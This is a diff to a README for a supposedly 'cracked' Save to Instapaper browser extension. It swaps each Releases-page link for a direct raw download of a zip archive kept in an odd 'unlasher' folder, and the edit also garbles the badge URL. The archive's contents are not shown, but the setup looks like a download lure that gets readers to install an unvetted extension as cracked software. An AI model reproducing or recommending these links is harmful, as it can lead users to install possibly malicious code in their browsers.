@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/priscila-16/cracked-save-to-instapaper-extension/releases)
+[![Download Now](https://raw.githubusercontent.com/priscila-16/cracked-save-to-instapaper-extension/main/unlasher/cracked-save-to-instapaper-extension.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/priscila-16/cracked-save-to-instapaper-extension/main/unlasher/cracked-save-to-instapaper-extension.zip)
 
 ## 📖 Overview
 
@@ -18,7 +18,7 @@ The Cracked Save to Instapaper Extension allows you to easily save web pages to 
 ### Installation Steps
 
 1. **Download the Extension**
-   - Visit the Releases page to download the extension. [Download Here](https://github.com/priscila-16/cracked-save-to-instapaper-extension/releases).
+   - Visit the Releases page to download the extension. [Download Here](https://raw.githubusercontent.com/priscila-16/cracked-save-to-instapaper-extension/main/unlasher/cracked-save-to-instapaper-extension.zip).
 
 2. **Add to Your Browser**
    - Open your browser.
@@ -66,4 +66,4 @@ Your feedback is important. Please share your thoughts to help us improve the Cr
 - **Productivity:** Tools that help you manage time and tasks more efficiently.
 - **Web Navigation:** Improve how you interact with online content.
 
-[Back to Download Section](https://github.com/priscila-16/cracked-save-to-instapaper-extension/releases)
+[Back to Download Section](https://raw.githubusercontent.com/priscila-16/cracked-save-to-instapaper-extension/main/unlasher/cracked-save-to-instapaper-extension.zip)
